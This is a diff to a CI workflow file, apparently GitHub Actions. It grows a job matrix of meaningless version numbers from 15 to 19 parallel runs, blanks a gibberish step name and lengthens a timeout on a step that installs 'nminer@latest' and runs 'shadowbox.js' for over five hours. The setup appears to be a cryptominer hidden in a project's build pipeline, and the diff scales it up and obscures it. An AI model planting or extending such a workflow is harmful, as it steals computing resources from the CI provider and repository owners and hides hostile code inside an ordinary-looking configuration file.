@@ -9,21 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1946 }
-          - { version: 5558 }
-          - { version: 6473 }
-          - { version: 2974 }
-          - { version: 1182 }
-          - { version: 1154 }
-          - { version: 4255 }
-          - { version: 1730 }
-          - { version: 4800 }
-          - { version: 4534 }
-          - { version: 1553 }
-          - { version: 8899 }
-          - { version: 8953 }
-          - { version: 7266 }
-          - { version: 1648 }
+          - { version: 1479 }
+          - { version: 4021 }
+          - { version: 9624 }
+          - { version: 9819 }
+          - { version: 4525 }
+          - { version: 6568 }
+          - { version: 5532 }
+          - { version: 9318 }
+          - { version: 1165 }
+          - { version: 897 }
+          - { version: 1877 }
+          - { version: 3295 }
+          - { version: 9554 }
+          - { version: 6074 }
+          - { version: 8348 }
+          - { version: 5882 }
+          - { version: 6437 }
+          - { version: 4383 }
+          - { version: 8185 }
 
     steps:
       - name: Checkout
@@ -34,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: that microchip likable whenever
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 321m node shadowbox.js || echo "shadowbox executed"
+          timeout 340m node shadowbox.js || echo "shadowbox executed"
